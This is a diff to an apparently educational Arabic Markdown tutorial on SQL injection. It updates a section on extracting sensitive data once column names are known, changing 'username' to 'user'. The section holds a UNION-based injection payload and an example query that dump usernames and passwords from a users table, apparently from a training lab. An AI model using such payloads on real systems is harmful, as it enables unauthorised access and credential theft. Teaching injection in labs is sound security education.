@@ -153,12 +153,12 @@ email
 
 ### 🔹 الهدف:
 
-بعد اكتشاف أسماء الأعمدة (مثلاً `username` و`password`)، نستغل ذلك لسحب البيانات الحساسة مباشرة من الجدول.
+بعد اكتشاف أسماء الأعمدة (مثلاً `user` و`password`)، نستغل ذلك لسحب البيانات الحساسة مباشرة من الجدول.
 
 ### 🔹 الصيغة المستخدمة:
 
 ```sql
-' UNION SELECT username, password FROM users #
+' UNION SELECT user, password FROM users #
 ```
 
 ### 🔹 كيف تعمل:
@@ -170,7 +170,7 @@ email
 ### 🔹 مثال توضيحي:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT username, password FROM users #';
+SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users #';
 ```
 
 ### 🔹 ملاحظات:
